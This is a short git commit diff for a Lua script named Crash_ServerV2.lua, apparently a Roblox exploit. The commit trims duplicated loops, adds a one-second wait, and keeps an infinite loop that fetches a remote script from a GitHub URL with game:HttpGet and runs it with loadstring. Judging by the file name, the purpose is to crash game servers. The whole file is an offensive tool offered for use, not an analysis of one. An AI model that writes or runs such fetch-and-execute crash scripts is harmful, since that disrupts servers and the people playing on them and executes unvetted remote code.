bb17dae1a46255bccc20fde89958c79f6f6b43fe
aA910FLsaIASFO1 <98718933+aA910FLsaIASFO1@users.noreply.github.com>
2022-05-30 21:24:08 -0300

    Update Crash_ServerV2.lua

--- Crash_ServerV2.lua
+++ Crash_ServerV2.lua
@@ -1,9 +1,4 @@
-while true do
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/aA910FLsaIASFO1/scripts/main/Crash_Server.lua"))()
-end
-while true do
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/aA910FLsaIASFO1/scripts/main/Crash_Server.lua"))()
-end
+wait(1)
 while true do
   loadstring(game:HttpGet("https://raw.githubusercontent.com/aA910FLsaIASFO1/scripts/main/Crash_Server.lua"))()
 end
